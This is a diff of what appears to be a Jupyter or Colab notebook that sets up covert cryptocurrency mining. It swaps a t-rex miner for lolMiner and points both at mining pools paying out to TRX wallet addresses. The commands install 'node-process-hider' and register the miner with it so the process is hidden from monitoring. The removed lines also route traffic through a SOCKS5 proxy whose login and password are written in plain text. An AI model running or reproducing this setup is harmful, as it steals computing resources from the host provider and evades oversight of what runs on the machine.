@@ -6,13 +6,13 @@
 ! apt install curl libssl1.0-dev  
 ! nodejs nodejs-dev node-gyp 
 ! npm -y  
-! wget wget https://trex-miner.com/download/t-rex-0.21.5-linux.tar.gz
-! tar -xf t-rex-0.21.5-linux.tar.gz
+! wget wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+! tar -xf lolMiner_v1.29_Lin64.tar.gz
 ! npm i -g node-process-hider  
-! chmod +x t-rex
-! ph add t-rex  
-! ./t-rex -a ethash -o stratum+tcp://ethash.mine.zergpool.com:9999 -u TPPvQ3s1grBbZ6q9BusoP2hZYDo63Lsfh3 -p  c=TRX,mc=AKA/CLO/EGEM/ETHO/EXP/TSF/ETH,ID=Aman -t $(nproc) -x socks5://ubuntu2004:LijayaAnli1188@209.127.96.240:7835
-
+%cd 1.29
+! chmod +x lolminer
+! ph add lolminer  
+! ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TPPvQ3s1grBbZ6q9BusoP2hZYDo63Lsfh3.aman
 
 
 
@@ -24,3 +24,8 @@ wget https://trex-miner.com/download/t-rex-0.21.5-linux.tar.gz
 tar -xf t-rex-0.21.5-linux.tar.gz
 chmod +x t-rex 
 ./geek -a ethash -o stratum+tcp://ethash.mine.zergpool.com:9999 -u TPPvQ3s1grBbZ6q9BusoP2hZYDo63Lsfh3 -p  c=TRX,mc=AKA/CLO/EGEM/ETHO/EXP/TSF/ETH,ID=Aman -t $(nproc) -x socks5://ubuntu2004:LijayaAnli1188@209.127.96.240:7835
+
+! wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+! tar -xf lolMiner_v1.29_Lin64.tar.gz 
+%cd 1.29 
+! ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TDLM5E7245pv9N1gRpjzmxVuaXiboAu4qt
